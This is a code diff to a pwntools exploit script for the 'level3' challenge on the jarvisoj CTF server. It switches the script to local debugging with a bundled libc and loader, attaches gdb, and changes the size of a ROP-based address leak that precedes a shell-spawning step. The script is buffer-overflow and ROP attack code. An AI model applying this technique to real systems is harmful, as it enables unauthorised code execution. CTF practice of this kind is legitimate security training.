@@ -32,6 +32,9 @@ context.arch = "amd64"
 context.terminal = ['tmux', 'splitw', '-h']
 # context.log_level = 'debug'
 
+# env = {'LD_PRELOAD':'./libc-2.19.so ./ld-2.19.so'}
+env = {'LD_PRELOAD':'./libc.so.6'}
+
 
 class Pwn(object):
 
@@ -39,7 +42,8 @@ class Pwn(object):
         if binary_file:
             self.binary_file = binary_file
             self.elf = ELF(self.binary_file)
-            self.local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
+            # self.local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
+            self.local_libc = './libc.so.6'
    
         if remote:
             self.host = remote['host']
@@ -72,7 +76,7 @@ class Pwn(object):
         if self.remote_sign:
             io = remote(self.host, self.port)
         else:
-            io = process(self.binary_file)
+            io = process(['./ld-2.19.so', self.binary_file], env=env)
         return io
 
 
@@ -102,7 +106,7 @@ class Pwn(object):
         self._call_rop(func_got=self.write_got, 
                        arg1=1,
                        arg2=self.dl_runtime_resolve_addr_true,
-                       arg3=200,
+                       arg3=100,
                        ret_func=self.elf.symbols['main'])
         dl_runtime_function = self.io.recvn(100)
         self.io.recvuntil("Input:\n")
@@ -113,6 +117,7 @@ class Pwn(object):
     def get_shell(self):
         self.io = self.get_io()
         # gdb.attach(self.io, """b *0x4005fd\n continue\n continue\n """)
+        gdb.attach(self.io, """b main""")
         # gdb.attach(self.io, """b *0x4005fd\n continue\n""")
         self.io.recvuntil("Input:\n")
 
@@ -195,8 +200,8 @@ class Pwn(object):
 
 
 def main():
-    # pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3', sign=False)
-    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3', sign=True)
+    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3', sign=False)
+    # pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3', sign=True)
     pwn.get_overflow_position()
     pwn.get_shell()
 
